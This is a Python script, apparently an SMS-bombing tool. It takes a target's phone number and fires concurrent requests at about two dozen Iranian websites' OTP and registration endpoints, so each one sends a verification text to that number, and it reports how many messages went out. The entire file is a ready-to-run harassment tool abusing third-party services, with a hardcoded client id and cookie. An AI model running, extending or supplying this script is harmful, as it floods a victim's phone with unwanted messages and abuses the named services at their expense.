import requests
import json
import argparse
import re
import time
from concurrent.futures import ThreadPoolExecutor

def formatPhoneNumber(phone_number):
    phone_number = re.sub(r'\D', '', phone_number)

    if phone_number.startswith('98'):
        return phone_number[2:]

    elif phone_number.startswith('0'):
        return phone_number[1:]

    return phone_number[-10:]

def sendRequest(request_info):
    url = request_info["url"]
    headers = request_info["headers"]
    data = request_info["data"]
    method = request_info["method"]

    start_time = time.time()

    if isinstance(data, dict):
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, json=data)
        elif method.upper() == 'GET':
            response = requests.get(url, headers=headers, params=data)
        else:
            response = requests.request(method, url, headers=headers, json=data)
    else:
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=data)
        elif method.upper() == 'GET':
            response = requests.get(url, headers=headers, params=data)
        else:
            response = requests.request(method, url, headers=headers, data=data)

    elapsed_time = (time.time() - start_time)

    return url, response.status_code, response.text, elapsed_time

parser = argparse.ArgumentParser(description="Phone number for API requests")
parser.add_argument('phone_number', type=str, help="Target's phone number")
args = parser.parse_args()

number = formatPhoneNumber(args.phone_number)

requests_data = [
    {
        "url": "https://core.gapfilm.ir/api/v3.2/Account/Login",
        "headers": {"Content-Type": "application/json"},
        "data": {"Method": 1, "PhoneNo": number},
        "method": "POST"
    },
    {
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": {"phone": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": {"phone": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://rojashop.com/api/send-otp-register",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": f"mobile=0{number}&withOtp=1",
        "method": "POST"
    },
    {
        "url": "https://apiv2.bookapo.com/v2/auth/login/",
        "headers": {"Content-Type": "application/json"},
        "data": {"mobile": f"98{number}"},
        "method": "POST"
    },
    {
        "url": "https://drdr.ir/api/v3/auth/login/mobile/init/",
        "headers": {"Content-Type": "application/json", "client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054"},
        "data": {"mobile": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": {"mobile": f"0{number}", "country_code": "+98"},
        "method": "POST"
    },
    {
        "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": {"username":f"0{number}", "isShortOtp": "true"},
        "method": "POST"
    },
    {
        "url": "https://api2.anten.ir/ids/api/auth/register",
        "headers": {"Content-Type": "application/json"},
        "data": {"phone": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://pinket.com/api/cu/v2/phone-verification",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": {"phoneNumber": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token",
        "headers": {"Content-Type": "application/json"},
        "data": {"username": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://api.ponisha.ir/api/v1/auth/register",
        "headers": {"Content-Type": "application/json"},
        "data": {"mobile": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://virgool.io/api/v1.4/auth/verify",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": {"method": "phone", "identifier": f"+98{number}", "type": "register"},
        "method": "POST"
    },
    {
        "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
        "headers": {"Content-Type": "application/json"},
        "data": number,
        "method": "POST"
    },
    {
        "url": "https://next.zarinpal.com/api/oauth/register",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": {"first_name": "aaa", "last_name": "aaa", "cell_number": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://api.atipay.net/user/otp",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": {"mobileNumber": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://www.portal.ir/site/api/v1/user/otp",
        "headers": {"Content-Type": "application/json", "Cookie": "csrfToken=0c882f11362f4f88; stats=EFw5T%2FaLsdzDlMPCSk%2BYXw%3D%3D"},
        "data": {"mobile": f"0{number}"},
        "method": "POST"
    },
    {
        "url": "https://api.zarinplus.com/user/otp/",
        "headers": {"Content-Type": "application/json"},
        "data": {"phone_number": f"98{number}", "source": "zarinplus"},
        "method": "POST"
    },
    {
        "url": f"https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=0{number}",
        "headers": "",
        "data": "",
        "method": "GET"
    },
    {
        "url": f"https://gw.taaghche.com/mybook/v4/site/auth/signupValidation?contact=0{number}",
        "headers": "",
        "data": "",
        "method": "GET"
    },
    {
        "url": f"https://filmnet.ir/api-v2/access-token/users/0{number}%20/otp",
        "headers": "",
        "data": "",
        "method": "GET"
    },
    {
        "url": f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{number}",
        "headers": "",
        "data": "",
        "method": "GET"
    },
    {
        "url": "https://www.giftcardstore.ir/Account/SmsLoginSendCode",
        "headers": {"Content-Type": "application/json"},
        "data": {"PhoneNumber": f"0{number}", "Server": 1},
        "method": "POST"
    },
    {
        "url": "https://gifkart.com/request/",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": f"PhoneNumber=0{number}",
        "method": "POST"
    }
]

sent = 0
print("-" * 50)

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(sendRequest, request_info) for request_info in requests_data]

    for future in futures:
        url, status_code, response_text, elapsed_time = future.result()
        status = "FAIL"

        if status_code == 200:
            sent += 1
            status = "SUCCESS"

        print(f"Request to {url} [{status}] took {elapsed_time:.2f} seconds")
        print("-" * 50)

print(f"{sent} messages sent")
